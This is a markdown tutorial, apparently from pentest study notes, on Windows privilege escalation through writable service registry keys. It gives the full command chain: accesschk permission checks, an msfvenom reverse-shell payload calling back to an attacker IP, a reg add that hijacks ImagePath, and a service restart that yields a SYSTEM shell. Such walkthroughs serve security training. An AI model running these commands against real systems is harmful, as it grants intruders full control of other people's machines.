# **Escalation via Insecure Registry Permissions**

### 🔍 What is it?

When a Windows service is created, a registry key is added at:

```
KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<ServiceName>
```

This key includes information like the **ImagePath** (the path to the executable the service runs).

If a user (other than an admin) has **write permissions** to this registry key, they can **modify the ImagePath** to point to a malicious executable — gaining elevated access when the service starts.

here you can see one service with details and ImagePath

<img width="892" height="352" alt="image" src="https://github.com/user-attachments/assets/f7c2a3b6-3443-49b2-bfe8-084102153111" />

## **Step-by-Step Exploitation Guide**

### **1. Find Vulnerable Service**

Run **WinPEAS** or **PowerUp.ps1** to find services with weak permissions:

<img width="903" height="71" alt="image" src="https://github.com/user-attachments/assets/0dd20912-e4b8-4a24-8e3e-40f062f16698" />

*(Example: Found service `regsvc`* 

### **2.** Check Registry Permissions

Run this to check if you have read/write access to the registry key:

```bash
accesschk.exe /accepteula -uvwqk "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc"
```

Look for `W` write access for groups like:

- `Users`
- `Everyone`
- `NT AUTHORITY\INTERACTIVE` (means any logged-in user can modify it)

Then Check if you can start/stop the service:

```
accesschk.exe /accepteula -ucqv user regsvc
```

✅ **You need:**

- **`SERVICE_START`**
- **`SERVICE_STOP`**

### **3. Check Current ImagePath**

View the current executable path:

```
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc"
```

Note the **`ImagePath`** value.

### **4. Create Malicious Payload**

Generate a reverse shell:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o evil.exe
```

Upload to victim machine (e.g., **`C:\Temp\evil.exe`**).

### **5. Modify the Registry**

Change the ImagePath to your payload:

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc" /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\evil.exe" /f
```

### **6. Trigger the Payload**

Restart the service:

```
net stop regsvc
net start regsvc
```

🎉 **You should receive a SYSTEM shell!**
